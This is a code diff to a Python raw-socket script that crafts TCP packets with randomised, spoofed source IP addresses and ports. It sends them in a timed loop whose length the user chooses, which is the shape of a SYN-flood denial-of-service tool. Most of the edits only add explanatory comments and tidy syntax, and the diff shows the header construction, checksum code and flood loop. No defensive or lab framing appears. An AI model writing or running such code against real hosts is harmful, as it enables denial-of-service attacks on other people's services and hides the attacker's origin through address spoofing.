@@ -14,6 +14,11 @@ class TCP_packet:
 
         try:
             self.socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+            '''
+            AF_INET : IPv4 address Family
+            SOCK_RAW : use raw socket to control headers of packet
+            IPPROTO_RAW : use raw ip protocol
+            '''
         except:
             print('error occured')
             sys.exit()
@@ -30,13 +35,15 @@ class TCP_packet:
                 s += msg[i]
 
 
-        s = (s>>16) + (s & 0xffff);
-        s = s + (s >> 16);
+        s = (s>>16) + (s & 0xffff)
+        s = s + (s >> 16)
 
         s = ~s & 0xffff
 
         return s
-
+    '''
+    making packet and adding tcp_headers
+    '''
     def makePacket(self):
         # ip header fields
         ip_ihl = 5
@@ -46,7 +53,7 @@ class TCP_packet:
         ip_id = 54321   #Id of this packet
         ip_frag_off = 0
         ip_ttl = 255
-        ip_proto = socket.IPPROTO_TCP
+        ip_proto = socket.IPPROTO_TCP #use TCP protocol
         ip_check = 0    # kernel will fill the correct checksum
         ip_saddr = socket.inet_aton ( self.source_ip )   #Spoof the source ip address if you want to
         ip_daddr = socket.inet_aton ( self.dest_ip )
@@ -72,20 +79,20 @@ class TCP_packet:
         tcp_urg_ptr = 0
 
         tcp_offset_res = (tcp_doff << 4) + 0
-        tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh <<3) + (tcp_ack << 4) + (tcp_urg << 5)
+        tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh <<3) + (tcp_ack << 4) + (tcp_urg << 5) #shift & plus = concat
 
         # the ! in the pack format string means network order
         tcp_header = pack('!HHLLBBHHH' , self.source_port, self.dest_port, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags,  tcp_window, tcp_check, tcp_urg_ptr)
 
         # pseudo header fields
-        source_address = socket.inet_aton( self.source_ip )
+        source_address = socket.inet_aton(self.source_ip)
         dest_address = socket.inet_aton(self.dest_ip)
         placeholder = 0
         protocol = socket.IPPROTO_TCP
         # tcp_length = len(tcp_header) + len(user_data)
         tcp_length = len(tcp_header)
 
-        psh = pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , tcp_length);
+        psh = pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , tcp_length)
         # psh = psh + tcp_header +bytes(user_data, 'utf-8');
         psh = psh + tcp_header
 
@@ -97,6 +104,9 @@ class TCP_packet:
         self.packet = ip_header + tcp_header
         return
 
+    '''
+    generating random ip & port# and make packet with it. 
+    '''
     def random_source(self):
         bits = random.getrandbits(32)
         self.source_ip = str(randint(0,255)) + '.' + str(randint(0,255)) + '.' + str(randint(0,255)) + '.' + str(randint(0,255))
@@ -110,7 +120,6 @@ class TCP_packet:
 
 if __name__ == "__main__":
     tcp = TCP_packet()
-    tcp.makePacket()
 
     end = input('How much seconds do you want?')
     start = time.time()
@@ -118,6 +127,7 @@ if __name__ == "__main__":
 
     count = 0
 
+    #do until time over
     while True:
         if time.time() > end:
             break
